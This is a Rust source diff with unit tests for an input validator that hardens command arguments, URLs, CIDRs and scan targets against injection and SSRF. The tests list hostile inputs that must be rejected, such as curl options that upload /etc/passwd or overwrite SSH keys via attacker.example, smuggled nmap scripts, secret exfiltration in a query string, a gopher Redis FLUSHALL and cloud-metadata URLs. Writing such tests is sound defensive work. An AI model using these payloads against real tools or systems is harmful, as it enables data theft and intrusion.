 pub fn validate_arg_with_custom_types(
     name: &str,
     def: &ArgDef,
     value: &str,
     custom_types: &std::collections::HashMap<String, crate::types::CustomTypeDef>,
 ) -> Result<String, ToolCladError> {
-    // Check if the type is a custom type
-    if let Some(custom) = custom_types.get(&def.type_name) {
-        // Verify the base type is valid
-        if !SUPPORTED_TYPES.contains(&custom.base.as_str()) {
-            return Err(ToolCladError::ManifestError(format!(
-                "custom type '{}' has invalid base type '{}'",
-                def.type_name, custom.base
-            )));
-        }
-        // Create a synthetic ArgDef with the custom type's constraints merged
-        let mut synthetic = def.clone();
-        synthetic.type_name = custom.base.clone();
-        if let Some(ref allowed) = custom.allowed {
-            synthetic.allowed = Some(allowed.clone());
-        }
-        if let Some(ref pattern) = custom.pattern {
-            synthetic.pattern = Some(pattern.clone());
-        }
-        if let Some(min) = custom.min {
-            synthetic.min = Some(min);
-        }
-        if let Some(max) = custom.max {
-            synthetic.max = Some(max);
-        }
-        if let Some(min_f) = custom.min_float {
-            synthetic.min_float = Some(min_f);
-        }
-        if let Some(max_f) = custom.max_float {
-            synthetic.max_float = Some(max_f);
-        }
-        return validate_arg(name, &synthetic, value);
-    }
+    validate_arg_with_custom_types_mode(name, def, value, custom_types, false)
+}
 
-    // Not a custom type, use standard validation
-    validate_arg(name, def, value)
+/// [`validate_arg_with_custom_types`] with an explicit command-form mode;
+/// `exec_mode` has the same meaning as in [`validate_arg_mode`].
+pub fn validate_arg_with_custom_types_mode(
+    name: &str,
+    def: &ArgDef,
+    value: &str,
+    custom_types: &std::collections::HashMap<String, crate::types::CustomTypeDef>,
+    exec_mode: bool,
+) -> Result<String, ToolCladError> {
+    validate_arg_with_custom_types_in(name, def, value, custom_types, exec_mode, None)
+}
+
+/// [`validate_arg_with_custom_types_mode`] with the project scope; `scope`
+/// has the same meaning as in [`validate_arg_in`].
+pub fn validate_arg_with_custom_types_in(
+    name: &str,
+    def: &ArgDef,
+    value: &str,
+    custom_types: &std::collections::HashMap<String, crate::types::CustomTypeDef>,
+    exec_mode: bool,
+    scope: Option<&ScopeDef>,
+) -> Result<String, ToolCladError> {
+    match resolve_custom_type(def, custom_types) {
+        Some(Ok(synthetic)) => validate_arg_in(name, &synthetic, value, exec_mode, scope),
+        Some(Err(e)) => Err(e),
+        None => validate_arg_in(name, def, value, exec_mode, scope),
+    }
+}
+
+/// The argument definition a custom type stands for: `def` with its type
+/// replaced by the custom type's base and the custom type's constraints
+/// (`allowed`, `pattern`, `min`, `max`, `min_float`, `max_float`) merged over
+/// it. `None` when `def.type_name` is not a custom type; an error when the
+/// custom type's base is not a built-in type.
+pub fn resolve_custom_type(
+    def: &ArgDef,
+    custom_types: &std::collections::HashMap<String, crate::types::CustomTypeDef>,
+) -> Option<Result<ArgDef, ToolCladError>> {
+    let custom = custom_types.get(&def.type_name)?;
+    if !SUPPORTED_TYPES.contains(&custom.base.as_str()) {
+        return Some(Err(ToolCladError::ManifestError(format!(
+            "custom type '{}' has invalid base type '{}'",
+            def.type_name, custom.base
+        ))));
+    }
+    let mut synthetic = def.clone();
+    synthetic.type_name = custom.base.clone();
+    if let Some(ref allowed) = custom.allowed {
+        synthetic.allowed = Some(allowed.clone());
+    }
+    if let Some(ref pattern) = custom.pattern {
+        synthetic.pattern = Some(pattern.clone());
+    }
+    if let Some(min) = custom.min {
+        synthetic.min = Some(min);
+    }
+    if let Some(max) = custom.max {
+        synthetic.max = Some(max);
+    }
+    if let Some(min_f) = custom.min_float {
+        synthetic.min_float = Some(min_f);
+    }
+    if let Some(max_f) = custom.max_float {
+        synthetic.max_float = Some(max_f);
+    }
+    Some(Ok(synthetic))
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::types::CustomTypeDef;
+    use std::collections::HashMap;
 
     fn make_arg(type_name: &str) -> ArgDef {
         ArgDef {
@@ -832,11 +1179,11 @@ mod tests {
         // pass as canonical IPs or sneak through as "hostnames".
         let def = make_arg("scope_target");
         for v in [
-            "2130706433",  // decimal integer
-            "0x7f000001",  // hex
-            "0177.0.0.1",  // octal-leading
-            "127.1",       // shorthand
-            "010.0.0.1",   // leading-zero octet
+            "2130706433", // decimal integer
+            "0x7f000001", // hex
+            "0177.0.0.1", // octal-leading
+            "127.1",      // shorthand
+            "010.0.0.1",  // leading-zero octet
         ] {
             assert!(validate_arg("t", &def, v).is_err(), "should reject {v}");
         }
@@ -874,38 +1221,77 @@ mod tests {
 
     #[test]
     fn test_scope_target_block_internal_off_allows_internal_by_default() {
-        // Default policy is permissive: tools that legitimately target internal
-        // hosts keep working. block_internal must be opted into.
+        // Default policy is permissive for loopback/private — tools that
+        // legitimately target internal hosts keep working without opt-in.
         let def = make_arg("scope_target");
         assert!(validate_arg("t", &def, "127.0.0.1").is_ok());
-        assert!(validate_arg("t", &def, "169.254.169.254").is_ok());
         assert!(validate_arg("t", &def, "10.0.0.5").is_ok());
         assert!(validate_arg("t", &def, "::1").is_ok());
+        // ...but link-local / cloud metadata is blocked UNCONDITIONALLY.
+        assert!(validate_arg("t", &def, "169.254.169.254").is_err());
+    }
+
+    #[test]
+    fn test_scope_target_blocks_metadata_unconditionally() {
+        let def = make_arg("scope_target"); // block_internal = false
+        for v in [
+            "169.254.169.254",
+            "169.254.0.1",
+            "::ffff:169.254.169.254",
+            "fe80::1",
+        ] {
+            let err = validate_arg("t", &def, v).unwrap_err().to_string();
+            assert!(err.contains("always blocked"), "{v} -> {err}");
+        }
     }
 
     #[test]
     fn test_scope_target_block_internal_on_rejects_non_public() {
         let def = blocking_arg();
-        // loopback / private / link-local (cloud metadata) / unspecified
         for v in [
             "127.0.0.1",
             "10.0.0.5",
             "192.168.1.1",
-            "169.254.169.254",  // IMDS
+            "169.254.169.254", // IMDS (always-block path)
             "0.0.0.0",
             "::1",
             "::ffff:127.0.0.1", // v4-mapped loopback must be unwrapped
             "fe80::1",          // IPv6 link-local
             "fc00::1",          // IPv6 unique-local
         ] {
-            let err = validate_arg("t", &def, v).unwrap_err().to_string();
-            assert!(err.contains("block_internal"), "{v} -> {err}");
+            assert!(validate_arg("t", &def, v).is_err(), "{v} should be blocked");
         }
-        // Public addresses and hostnames still pass under the policy.
+        // Public literals still pass under the policy. A public *name* now
+        // needs DNS resolution, so the positive cases stay literal and the
+        // name path is covered by the `.invalid` fail-closed test.
         assert!(validate_arg("t", &def, "93.184.216.34").is_ok());
-        assert!(validate_arg("t", &def, "example.com").is_ok());
-        // CIDR with an internal base is blocked too.
+        assert!(validate_arg("t", &def, "2606:4700::1111").is_ok());
+        // A CIDR overlapping an internal range is blocked too.
         assert!(validate_arg("t", &def, "10.0.0.0/24").is_err());
+    }
+
+    #[test]
+    fn test_url_host_hardening() {
+        let public = make_arg("url");
+        // valid public URL passes
+        assert!(validate_arg("u", &public, "https://example.com/path").is_ok());
+        assert!(validate_arg("u", &public, "http://93.184.216.34/x").is_ok());
+        // cloud metadata blocked unconditionally, even without block_internal
+        assert!(validate_arg("u", &public, "http://169.254.169.254/latest/meta-data/").is_err());
+        // obfuscated IP hosts rejected
+        assert!(validate_arg("u", &public, "http://0x7f000001/").is_err());
+        assert!(validate_arg("u", &public, "http://2130706433/").is_err());
+        // punycode host rejected
+        assert!(validate_arg("u", &public, "http://xn--example-9c.com/").is_err());
+        // loopback allowed only when block_internal is off
+        assert!(validate_arg("u", &public, "http://127.0.0.1/").is_ok());
+        let blocking = ArgDef {
+            type_name: "url".to_string(),
+            block_internal: true,
+            ..Default::default()
+        };
+        assert!(validate_arg("u", &blocking, "http://127.0.0.1/").is_err());
+        assert!(validate_arg("u", &blocking, "http://10.0.0.5/x").is_err());
     }
 
     #[test]
@@ -1011,8 +1397,20 @@ mod tests {
     fn test_cidr() {
         let def = make_arg("cidr");
         assert!(validate_arg("c", &def, "10.0.0.0/24").is_ok());
+        assert!(validate_arg("c", &def, "2606:4700::/32").is_ok());
         assert!(validate_arg("c", &def, "10.0.0.0/33").is_err());
         assert!(validate_arg("c", &def, "10.0.0.0").is_err());
+        for v in [
+            "2606:4700::/129",
+            "10.0.0.0/024",
+            "10.0.0.0/+24",
+            "2606:4700::",
+            "[2606:4700::]/32",
+            "0x0a000000/8",
+        ] {
+            let err = validate_arg("c", &def, v).unwrap_err().to_string();
+            assert!(err.contains("not valid CIDR notation"), "{v}: {err}");
+        }
     }
 
     #[test]
@@ -1084,5 +1482,1232 @@ mod tests {
     fn test_regex_match_no_pattern() {
         let def = make_arg("regex_match");
         assert!(validate_arg("code", &def, "anything").is_err()); // missing pattern
+    }
+
+    // ---- W1.5 string-derived value hygiene ------------------------------
+
+    #[test]
+    fn test_tc1_payloads_rejected() {
+        // Quote break-out into extra curl options.
+        let s = make_arg("string");
+        assert!(validate_arg("h", &s, "' -d @/etc/passwd").is_err());
+        assert!(validate_arg("h", &s, "X: y' -d @/etc/passwd -H 'Z: w").is_err());
+        let u = make_arg("url");
+        assert!(validate_arg(
+            "u",
+            &u,
+            "https://attacker.example/ -o /root/.ssh/authorized_keys"
+        )
+        .is_err());
+        assert!(validate_arg("u", &u, "https://attacker.example/ -o /tmp/pwned").is_err());
+
+        // exec mode with allow_whitespace does not rescue any of them: quotes
+        // are banned outright and a url never admits whitespace.
+        let mut s2 = make_arg("string");
+        s2.allow_whitespace = true;
+        assert!(validate_arg_mode("h", &s2, "' -d @/etc/passwd", true).is_err());
+        assert!(validate_arg_mode("h", &s2, "X: y' -d @/etc/passwd -H 'Z: w", true).is_err());
+        let mut u2 = make_arg("url");
+        u2.allow_whitespace = true;
+        assert!(
+            validate_arg_mode("u", &u2, "https://attacker.example/ -o /tmp/pwned", true).is_err()
+        );
+    }
+
+    #[test]
+    fn test_tc2_payloads_rejected() {
+        // Option smuggling through a free-text "extra flags" string.
+        let payloads = [
+            "-iL /etc/passwd",
+            "--script=/tmp/evil.nse",
+            "--script http-fetch --script-args http-fetch.destination=/tmp/d",
+        ];
+        let s = make_arg("string");
+        for v in payloads {
+            assert!(
+                validate_arg("extra_flags", &s, v).is_err(),
+                "should reject {v:?}"
+            );
+        }
+        // Even with whitespace permitted in exec mode, the leading dash holds.
+        let mut s2 = make_arg("string");
+        s2.allow_whitespace = true;
+        for v in payloads {
+            let err = validate_arg_mode("extra_flags", &s2, v, true)
+                .unwrap_err()
+                .to_string();
+            assert!(
+                err.contains("must not start with '-' or '+'"),
+                "{v:?}: {err}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_tc3_leading_dash_rejected() {
+        let err = validate_arg("p", &make_arg("path"), "-rf")
+            .unwrap_err()
+            .to_string();
+        assert!(
+            err.contains(
+                "must not start with '-' or '+' (set allow_leading_dash = true to permit)"
+            ),
+            "unexpected: {err}"
+        );
+        assert!(validate_arg("s", &make_arg("string"), "--output=/etc/cron.d/x").is_err());
+        assert!(validate_arg("n", &make_arg("integer"), "-1").is_err());
+        assert!(validate_arg("s", &make_arg("string"), "+short").is_err());
+        assert!(validate_arg("f", &make_arg("number"), "-0.5").is_err());
+
+        // Numeric types apply the rule to the output: clamping rescues a
+        // negative input, and a leading '+' that parses away is fine.
+        let mut n = make_arg("integer");
+        n.min = Some(1);
+        n.clamp = true;
+        assert_eq!(validate_arg("n", &n, "-5").unwrap(), "1");
+        let mut f = make_arg("number");
+        f.min_float = Some(0.0);
+        f.clamp = true;
+        assert_eq!(validate_arg("f", &f, "-2.5").unwrap(), "0");
+        assert_eq!(validate_arg("n", &make_arg("integer"), "+7").unwrap(), "7");
+    }
+
+    #[test]
+    fn test_tc3_allow_leading_dash_opt_in() {
+        let mut s = make_arg("string");
+        s.allow_leading_dash = true;
+        assert_eq!(validate_arg("s", &s, "-v").unwrap(), "-v");
+        // The opt-in is independent of the command form.
+        assert_eq!(validate_arg_mode("s", &s, "-v", true).unwrap(), "-v");
+        let mut n = make_arg("integer");
+        n.allow_leading_dash = true;
+        assert_eq!(validate_arg("n", &n, "-1").unwrap(), "-1");
+        // Without the opt-in, exec mode does not help.
+        assert!(validate_arg_mode("s", &make_arg("string"), "-v", true).is_err());
+    }
+
+    #[test]
+    fn test_nul_rejected_for_every_type() {
+        for t in SUPPORTED_TYPES {
+            let mut d = make_arg(t);
+            if *t == "enum" {
+                // Only the NUL rule can refuse this: the value is in `allowed`.
+                d.allowed = Some(vec!["a\0b".to_string()]);
+            }
+            if *t == "regex_match" {
+                d.pattern = Some(".*".to_string());
+            }
+            let err = validate_arg("x", &d, "a\0b").unwrap_err().to_string();
+            assert!(err.contains("must not contain NUL bytes"), "{t}: {err}");
+        }
+    }
+
+    #[test]
+    fn test_control_chars_quotes_whitespace_rejected() {
+        let s = make_arg("string");
+        let err = validate_arg("s", &s, "a\x01b").unwrap_err().to_string();
+        assert!(err.contains("must not contain control characters"), "{err}");
+        assert!(validate_arg("s", &s, "a\x7fb").is_err());
+        assert!(validate_arg("s", &s, "a\tb").is_err());
+        assert!(validate_arg("s", &s, "a\nb").is_err());
+        // C1 range (U+0080–U+009F) counts as control too.
+        let err = validate_arg("s", &s, "a\u{85}b").unwrap_err().to_string();
+        assert!(err.contains("must not contain control characters"), "{err}");
+        assert!(validate_arg("s", &s, "a\u{80}b").is_err());
+        assert!(validate_arg("s", &s, "a\u{9f}b").is_err());
+
+        let err = validate_arg("s", &s, "a'b").unwrap_err().to_string();
+        assert!(
+            err.contains("must not contain quote or backslash characters"),
+            "{err}"
+        );
+        assert!(validate_arg("s", &s, "a\"b").is_err());
+        assert!(validate_arg("s", &s, "a\\b").is_err());
+
+        let err = validate_arg("s", &s, "a b").unwrap_err().to_string();
+        assert!(err.contains("must not contain whitespace"), "{err}");
+        assert!(validate_arg("s", &s, "a\u{a0}b").is_err()); // non-ASCII whitespace
+        assert!(validate_arg("s", &s, " a").is_err()); // raw value, never trimmed
+
+        // The rules cover every string-derived type.
+        for t in STRING_DERIVED_TYPES {
+            let mut d = make_arg(t);
+            if *t == "regex_match" {
+                d.pattern = Some(".*".to_string());
+            }
+            assert!(
+                validate_arg("x", &d, "a'b").is_err(),
+                "{t} should reject a quote"
+            );
+            assert!(
+                validate_arg("x", &d, "a\x01b").is_err(),
+                "{t} should reject a control char"
+            );
+        }
+
+        // scope_target keeps its more specific backslash message.
+        let err = validate_arg("t", &make_arg("scope_target"), "a\\b")
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("backslash escape sequences"), "{err}");
+
+        // enum is exempt from rules 2–5: allowed values are manifest text.
+        let mut e = make_arg("enum");
+        e.allowed = Some(vec!["-sV".to_string(), "a b".to_string()]);
+        assert_eq!(validate_arg("e", &e, "-sV").unwrap(), "-sV");
+        assert_eq!(validate_arg("e", &e, "a b").unwrap(), "a b");
+    }
+
+    #[test]
+    fn test_allow_whitespace_only_in_exec_mode() {
+        let mut s = make_arg("string");
+        s.allow_whitespace = true;
+        assert!(validate_arg("s", &s, "a b").is_err()); // public default is strict
+        assert!(validate_arg_mode("s", &s, "a b", false).is_err());
+        assert_eq!(validate_arg_mode("s", &s, "a b", true).unwrap(), "a b");
+        assert_eq!(
+            validate_arg_mode("s", &s, "X-Trace: abc def", true).unwrap(),
+            "X-Trace: abc def"
+        );
+        // The opt-in admits ONLY the ASCII space U+0020. Control whitespace is
+        // still a control character (rule 2 is unconditional) and every other
+        // Unicode space is a homoglyph, not a separator.
+        for v in ["a\tb", "a\nb", "a\rb", "a\x0bb", "a\x0cb"] {
+            let err = validate_arg_mode("s", &s, v, true).unwrap_err().to_string();
+            assert!(
+                err.contains("must not contain control characters"),
+                "{v:?}: {err}"
+            );
+        }
+        for v in [
+            "a\u{a0}b",
+            "a\u{2000}b",
+            "a\u{200a}b",
+            "a\u{2028}b",
+            "a\u{2029}b",
+            "a\u{3000}b",
+        ] {
+            let err = validate_arg_mode("s", &s, v, true).unwrap_err().to_string();
+            assert!(err.contains("must not contain whitespace"), "{v:?}: {err}");
+        }
+        assert!(validate_arg_mode("s", &s, "a\x01b", true).is_err());
+        // Without the opt-in, exec mode is still strict.
+        assert!(validate_arg_mode("s", &make_arg("string"), "a b", true).is_err());
+        // msf_options keeps its space separator in every mode, and only U+0020.
+        assert!(validate_arg("m", &make_arg("msf_options"), "RHOSTS 10.0.1.1").is_ok());
+        assert!(validate_arg("m", &make_arg("msf_options"), "RHOSTS\t10.0.1.1").is_err());
+        assert!(validate_arg("m", &make_arg("msf_options"), "RHOSTS\u{a0}10.0.1.1").is_err());
+        assert!(validate_arg("m", &make_arg("msf_options"), "RHOSTS 'x'").is_err());
+        assert!(validate_arg("m", &make_arg("msf_options"), "-RHOSTS x").is_err());
+    }
+
+    #[test]
+    fn test_pattern_is_anchored() {
+        let mut s = make_arg("string");
+        s.pattern = Some("[a-z]+".to_string());
+        assert!(validate_arg("s", &s, "abc").is_ok());
+        assert!(validate_arg("s", &s, "abc123").is_err());
+        assert!(validate_arg("s", &s, "123abc").is_err());
+        let mut r = make_arg("regex_match");
+        r.pattern = Some("[a-z]+".to_string());
+        assert!(validate_arg("r", &r, "abc").is_ok());
+        assert!(validate_arg("r", &r, "abc123").is_err());
+
+        assert_eq!(anchor_pattern("[a-z]+"), "^(?:[a-z]+)$");
+        assert_eq!(anchor_pattern("^[a-z]+$"), "^(?:[a-z]+)$");
+        assert_eq!(anchor_pattern(r"a\$"), r"^(?:a\$)$");
+
+        // Custom types go through the same anchoring.
+        let custom = HashMap::from([(
+            "slug".to_string(),
+            CustomTypeDef {
+                base: "string".to_string(),
+                allowed: None,
+                pattern: Some("[a-z]+".to_string()),
+                min: None,
+                max: None,
+                min_float: None,
+                max_float: None,
+            },
+        )]);
+        assert!(validate_arg_with_custom_types("s", &make_arg("slug"), "abc123", &custom).is_err());
+        assert!(validate_arg_with_custom_types("s", &make_arg("slug"), "abc", &custom).is_ok());
+        // ...and the custom-type path honors the mode flag the same way.
+        let mut spaced = make_arg("slug");
+        spaced.allow_whitespace = true;
+        let custom_any = HashMap::from([(
+            "slug".to_string(),
+            CustomTypeDef {
+                base: "string".to_string(),
+                allowed: None,
+                pattern: Some("[a-z ]+".to_string()),
+                min: None,
+                max: None,
+                min_float: None,
+                max_float: None,
+            },
+        )]);
+        assert!(validate_arg_with_custom_types("s", &spaced, "a b", &custom_any).is_err());
+        assert!(
+            validate_arg_with_custom_types_mode("s", &spaced, "a b", &custom_any, true).is_ok()
+        );
+    }
+
+    // ---- url validator (W3) and host policy (W4) ----
+
+    fn url_arg(block_internal: bool, schemes: &[&str]) -> ArgDef {
+        ArgDef {
+            type_name: "url".to_string(),
+            block_internal,
+            schemes: schemes.iter().map(|s| s.to_string()).collect(),
+            ..Default::default()
+        }
+    }
+
+    #[test]
+    fn test_url_injection_vectors_inline() {
+        // Mirrors every `url-*` vector in tests/injection_vectors.json; a
+        // later wave reads the file directly.
+        struct Vector {
+            id: &'static str,
+            value: &'static str,
+            block_internal: bool,
+            schemes: &'static [&'static str],
+            accept: bool,
+        }
+        let vectors = [
+            Vector {
+                id: "url-space-option-injection",
+                value: "https://attacker.example/ -o /root/.ssh/authorized_keys",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-space-write-tmp",
+                value: "https://attacker.example/ -o /tmp/pwned",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-secret-smuggling",
+                value: "https://attacker.example/?k={_secret:api_key}",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-javascript-scheme",
+                value: "javascript:alert(1)",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-file-scheme",
+                value: "file:///etc/passwd",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-data-scheme",
+                value: "data:text/html,<script>1</script>",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-gopher-redis",
+                value: "gopher://127.0.0.1:6379/_FLUSHALL",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-dict-scheme",
+                value: "dict://127.0.0.1:11211/stat",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-userinfo",
+                value: "http://user:pw@example.com/",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-metacharacter",
+                value: "https://attacker.example/;id",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-scheme-not-in-list",
+                value: "http://example.com/",
+                block_internal: false,
+                schemes: &["https"],
+                accept: false,
+            },
+            Vector {
+                id: "url-imds-always-blocked",
+                value: "http://169.254.169.254/latest/meta-data/",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-docker-socket-block-internal",
+                value: "http://127.0.0.1:2375/containers/json",
+                block_internal: true,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-ipv6-loopback-block-internal",
+                value: "http://[::1]:8080/",
+                block_internal: true,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-accept",
+                value: "https://example.com/path",
+                block_internal: false,
+                schemes: &[],
+                accept: true,
+            },
+            Vector {
+                id: "url-accept-public-ip-block-internal",
+                value: "https://93.184.216.34/x",
+                block_internal: true,
+                schemes: &[],
+                accept: true,
+            },
+        ];
+        for v in &vectors {
+            let def = url_arg(v.block_internal, v.schemes);
+            let result = validate_arg("u", &def, v.value);
+            assert_eq!(result.is_ok(), v.accept, "{}: {result:?}", v.id);
+        }
+    }
+
+    #[test]
+    fn test_url_honors_schemes_list() {
+        // The regression this wave closes: Rust ignored `schemes` entirely.
+        let https_only = url_arg(false, &["https"]);
+        let err = validate_arg("u", &https_only, "http://example.com/")
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("scheme 'http' is not permitted"), "{err}");
+        assert!(validate_arg("u", &https_only, "https://example.com/").is_ok());
+        // Case-insensitive on both sides.
+        assert!(validate_arg("u", &https_only, "HTTPS://example.com/").is_ok());
+        assert!(validate_arg("u", &url_arg(false, &["HTTPS"]), "https://example.com/").is_ok());
+        // A custom scheme can be allowed when it is not on the denylist, and
+        // listing it drops the defaults.
+        let custom = url_arg(false, &["custom"]);
+        assert!(validate_arg("u", &custom, "custom://example.com/").is_ok());
+        assert!(validate_arg("u", &custom, "https://example.com/").is_err());
+        // Unset means http + https.
+        let def = make_arg("url");
+        assert!(validate_arg("u", &def, "http://example.com/").is_ok());
+        assert!(validate_arg("u", &def, "https://example.com/").is_ok());
+        let err = validate_arg("u", &def, "custom://example.com/")
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("allowed: http, https"), "{err}");
+    }
+
+    #[test]
+    fn test_url_denied_schemes_even_when_listed() {
+        for scheme in [
+            "javascript",
+            "data",
+            "file",
+            "blob",
+            "about",
+            "gopher",
+            "dict",
+            "ftp",
+            "ldap",
+            "jar",
+            "netdoc",
+            "mailto",
+            "ws",
+            "wss",
+        ] {
+            let def = url_arg(false, &[scheme]);
+            let value = format!("{scheme}://example.com/x");
+            let err = validate_arg("u", &def, &value).unwrap_err().to_string();
+            assert!(err.contains("never permitted"), "{scheme}: {err}");
+            // Mixed case does not slip past the denylist.
+            let upper = format!("{}://example.com/x", scheme.to_ascii_uppercase());
+            assert!(validate_arg("u", &def, &upper).is_err(), "{upper}");
+        }
+        // Not listed: the ordinary allowlist message applies.
+        let err = validate_arg("u", &make_arg("url"), "file:///etc/passwd")
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("not permitted"), "{err}");
+    }
+
+    #[test]
+    fn test_url_structure() {
+        let def = make_arg("url");
+        // No scheme separator.
+        let err = validate_arg("u", &def, "example.com/path")
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("expected scheme://host"), "{err}");
+        assert!(validate_arg("u", &def, "javascript:alert(1)").is_err());
+        // Userinfo hides the real host from a reviewer.
+        let err = validate_arg("u", &def, "http://user:pw@example.com/")
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("userinfo"), "{err}");
+        assert!(validate_arg("u", &def, "http://evil.example@example.com/").is_err());
+        // An `@` after the authority is just path or query data.
+        assert!(validate_arg("u", &def, "https://example.com/@handle").is_ok());
+        assert!(validate_arg("u", &def, "https://example.com/?to=a@b").is_ok());
+        // Empty host.
+        for v in ["http:///path", "http://", "http://:8080/", "http://?q=1"] {
+            let err = validate_arg("u", &def, v).unwrap_err().to_string();
+            assert!(err.contains("empty host"), "{v}: {err}");
+        }
+        // Query or fragment directly after the host, and no path at all.
+        assert!(validate_arg("u", &def, "https://example.com").is_ok());
+        assert!(validate_arg("u", &def, "https://example.com?q=1").is_ok());
+        assert!(validate_arg("u", &def, "https://example.com#frag").is_ok());
+        // Unbracketed IPv6 is ambiguous with a port.
+        let err = validate_arg("u", &def, "http://::1/")
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("enclosed in brackets"), "{err}");
+        assert!(validate_arg("u", &def, "https://example.com:80:80/").is_err());
+        // Host character set and DNS limits.
+        assert!(validate_arg("u", &def, "http://exa_mple.com/").is_err());
+        assert!(validate_arg("u", &def, "http://-example.com/").is_err());
+        assert!(validate_arg("u", &def, "http://exa%41mple.com/").is_err());
+        let err = validate_arg("u", &def, "http://exämple.com/")
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("ASCII"), "{err}");
+        let long_label = format!("http://{}.com/", "a".repeat(64));
+        assert!(validate_arg("u", &def, &long_label).is_err());
+        assert!(validate_arg("u", &def, &format!("http://{}.com/", "a".repeat(63))).is_ok());
+        // Whitespace is never admitted, even in exec mode with the opt-in.
+        let mut lenient = make_arg("url");
+        lenient.allow_whitespace = true;
+        assert!(validate_arg_mode("u", &lenient, "https://example.com/ -o x", true).is_err());
+    }
+
+    #[test]
+    fn test_url_ports() {
+        let def = make_arg("url");
+        for v in [
+            "https://example.com:8443/x",
+            "https://example.com:8443",
+            "https://example.com:1/",
+            "https://example.com:65535/",
+            "http://93.184.216.34:8080/x",
+        ] {
+            assert!(validate_arg("u", &def, v).is_ok(), "{v}");
+        }
+        for v in [
+            "https://example.com:0/x",
+            "https://example.com:99999/x",
+            "https://example.com:65536/",
+            "https://example.com:/x",
+            "https://example.com:+80/",
+            "https://example.com:8a/",
+        ] {
+            let err = validate_arg("u", &def, v).unwrap_err().to_string();
+            assert!(err.contains("port must be 1-65535"), "{v}: {err}");
+        }
+    }
+
+    #[test]
+    fn test_url_authority_split_unwraps_bracketed_ipv6() {
+        // `[` and `]` are shell metacharacters, so a bracketed literal never
+        // reaches the structural parse through validate_arg; the splitter is
+        // exercised directly so the unwrap stays correct.
+        let h = split_url_authority("u", "[::1]:8080").unwrap();
+        assert_eq!(h.host, "::1");
+        assert_eq!(h.port, Some(8080));
+        assert_eq!(h.bracketed_v6, Some(Ipv6Addr::LOCALHOST));
+        let h = split_url_authority("u", "[2001:db8::1]").unwrap();
+        assert_eq!(h.port, None);
+        assert_eq!(h.bracketed_v6, Some("2001:db8::1".parse().unwrap()));
+        assert_eq!(
+            split_url_authority("u", "example.com:8443").unwrap(),
+            UrlHost {
+                host: "example.com",
+                port: Some(8443),
+                bracketed_v6: None,
+            }
+        );
+        assert_eq!(
+            split_url_authority("u", "example.com").unwrap(),
+            UrlHost {
+                host: "example.com",
+                port: None,
+                bracketed_v6: None,
+            }
+        );
+        for bad in [
+            "[::1",
+            "[::1]x",
+            "[::1]:",
+            "[::1]:0",
+            "[]",
+            "[example.com]",
+            "[::1]]",
+            "",
+            ":80",
+        ] {
+            assert!(split_url_authority("u", bad).is_err(), "{bad}");
+        }
+    }
+
+    #[test]
+    fn test_url_block_internal_policy() {
+        let blocking = url_arg(true, &[]);
+        for v in [
+            "http://127.0.0.1/",
+            "http://127.0.0.1:2375/containers/json",
+            "http://[::1]:8080/",
+            "http://10.0.0.5/x",
+            "http://192.168.1.1/",
+            "http://172.16.0.1/",
+            "http://100.64.0.1/",
+            "http://0.0.0.0/",
+            "http://198.18.0.1/",
+            "http://240.0.0.1/",
+            "http://192.0.2.1/",
+            "http://255.255.255.255/",
+        ] {
+            let err = validate_arg("u", &blocking, v).unwrap_err().to_string();
+            assert!(
+                err.contains("block_internal") || err.contains("metacharacter"),
+                "{v}: {err}"
+            );
+        }
+        assert!(validate_arg("u", &blocking, "https://93.184.216.34/x").is_ok());
+        assert!(validate_arg("u", &blocking, "https://8.8.8.8:8443/").is_ok());
+        // Off by default: internal literals pass, except the always-blocked
+        // tier.
+        let open = make_arg("url");
+        for v in [
+            "http://127.0.0.1/",
+            "http://10.0.0.5/x",
+            "http://100.64.0.1/",
+            "http://198.18.0.1/",
+            "http://240.0.0.1/",
+        ] {
+            assert!(validate_arg("u", &open, v).is_ok(), "{v}");
+        }
+    }
+
+    #[test]
+    fn test_url_imds_blocked_in_both_modes() {
+        for block_internal in [false, true] {
+            let def = url_arg(block_internal, &[]);
+            for v in [
+                "http://169.254.169.254/latest/meta-data/",
+                "http://169.254.169.254:80/",
+                "http://169.254.0.1/",
+            ] {
+                let err = validate_arg("u", &def, v).unwrap_err().to_string();
+                assert!(err.contains("always blocked"), "{v}: {err}");
+            }
+            // The v4-mapped spelling needs brackets in a URL, which the
+            // metacharacter rule refuses first; the policy itself is checked
+            // on the literal directly.
+            assert!(validate_arg("u", &def, "http://[::ffff:169.254.169.254]/").is_err());
+            let mapped: IpAddr = "::ffff:169.254.169.254".parse().unwrap();
+            let err = enforce_ip_policy("u", &mapped, block_internal)
+                .unwrap_err()
+                .to_string();
+            assert!(err.contains("always blocked"), "{err}");
+        }
+    }
+
+    #[test]
+    fn test_scope_target_block_internal_full_table() {
+        let def = blocking_arg();
+        for v in [
+            "10.0.0.5",
+            "192.168.1.1",
+            "172.16.0.1",
+            "0.0.0.0",
+            "0.1.2.3",
+            "::1",
